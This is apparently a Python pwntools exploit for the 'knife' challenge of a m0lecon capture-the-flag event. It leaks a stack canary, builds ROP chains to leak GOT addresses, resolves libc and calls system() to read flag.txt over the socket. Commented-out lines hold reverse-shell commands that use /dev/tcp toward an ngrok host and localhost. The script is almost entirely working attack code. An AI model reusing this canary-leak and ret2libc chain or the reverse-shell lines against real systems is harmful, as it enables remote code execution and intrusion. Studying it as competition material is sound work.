#!/usr/bin/python

from pwn import *
from LibcSearcher import *

DEBUG = False

context.log_level = 'debug'
#s1 = process('./knife')
port = 1337
if DEBUG:
    s = remote('localhost', str(port))
else:
    s = remote('challs.m0lecon.it', 9010)
 

#Leak canary
#for i in range(-19, 8):
#    s.sendline('LOAD ' + str(i))
#    s.recv(8)

s.sendline('LOAD 3')
leak1   = s.recv(8)
s.sendline('LOAD 7')
leak2   = s.recv(8)
s.sendline('LOAD 0')
rbp     = u64(s.recv(8))
arg      = rbp - 0x30 +  5
if leak1 == leak2:
    canary = leak1
    log.success('canary: ' + hex(u64(canary)))
else:
    log.failure('Error')
    exit()

#Attack, leak libc
fd              = 4
elf             = ELF('./knife')
write_plt       = elf.plt['write']
read_plt        = elf.plt['read']
write_got       = elf.got['write']
read_got        = elf.got['read']
setbuf_got      = elf.got['setbuf']
atoi_got        = elf.got['atoi']
strtok_got      = elf.got['strtok']
open_got       = elf.got['open']
pop_r13_r14_r15 = 0x4014ee
pop_rdi         = 0x4014f3
pop_rsi_r15     = 0x4014f1

payload  = 'EXIT'
payload  = payload.ljust(0x28, '\x00')
payload += canary
payload += 'A'*8 #rbp
payload += p64(pop_rdi)
payload += p64(fd)
payload += p64(pop_rsi_r15)
payload += p64(write_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rsi_r15)
payload += p64(read_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rsi_r15)
payload += p64(setbuf_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rsi_r15)
payload += p64(atoi_got) + p64(0)
payload += p64(write_plt)

payload += p64(pop_rsi_r15)
payload += p64(strtok_got) + p64(0)
payload += p64(write_plt)

s.sendline(payload)
write    = u64(s.recv(0x17)[:8]) 
read     = u64(s.recv(0x17)[:8])
setbuf   = u64(s.recv(0x17)[:8])
atoi     = u64(s.recv(0x17)[:8])
strtok   = u64(s.recv(0x17)[:8])
#_open    = u64(s.recv(0x17)[:8])
libc     = LibcSearcher('write', write)
libc.add_condition('read', read)
libc.add_condition('setbuf', setbuf)
libc.add_condition('atoi', atoi)
libc.add_condition('strtok', strtok)
#libc.add_condition('open', _open)
base     = write - libc.dump('write')
system   = base + libc.dump('system')
binsh    = base + libc.dump('str_bin_sh')
log.success('system: ' + hex(system))
log.success('binsh: ' + hex(binsh))
s.close()

#--------------------
#if DEBUG:
#    s = remote('localhost', str(port))
#else:
#    s = remote('challs.m0lecon.it', 9010)
#payload  = 'EXIT'
#payload  = payload.ljust(0x28, '\x00')
#payload += canary
#payload += 'A'*8 #rbp
#payload += p64(pop_rdi)
#payload += p64(fd)
#payload += p64(pop_rsi_r15)
#payload += p64(arg-5) + p64(0)
#payload += p64(write_plt)
#s.sendline(payload)
#s.recv(0x17)
#s.close()


#----------------------
bss = 0x602500

if DEBUG:
    s = remote('localhost', str(port))
else:
    s = remote('challs.m0lecon.it', 9010)
log.success('arg: ' + hex(arg))
payload  = 'EXIT'#\x00/bin/sh\x00'#bash -i >& /dev/tcp/localhost/1234 0>&1'
payload  = payload.ljust(0x28, '\x00')
payload += canary
payload += 'A'*8
payload += p64(pop_rdi)
payload += p64(fd)
payload += p64(pop_rsi_r15)
payload += p64(bss) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rsi_r15)
payload += p64(bss+0x17) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rsi_r15)
payload += p64(bss+0x17*2) + p64(0)
payload += p64(read_plt)
payload += p64(pop_rdi)
payload += p64(bss)
payload += p64(pop_rsi_r15)
payload += p64(0)*2
payload += p64(system)
s.sendline(payload)

#revsh    = 'bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/15585 0>&1'
#revsh       = 'bash -i >& /dev/tcp/localhost/1234 0>&4 1>&4'
revsh = 'cat flag.txt >&4'

sleep(1)
s.sendline(revsh[0:17])
sleep(1)
s.sendline(revsh[17:17*2])
sleep(1)
s.sendline(revsh[17*2:] + '\x00')
s.recv(0x17)

s.interactive()
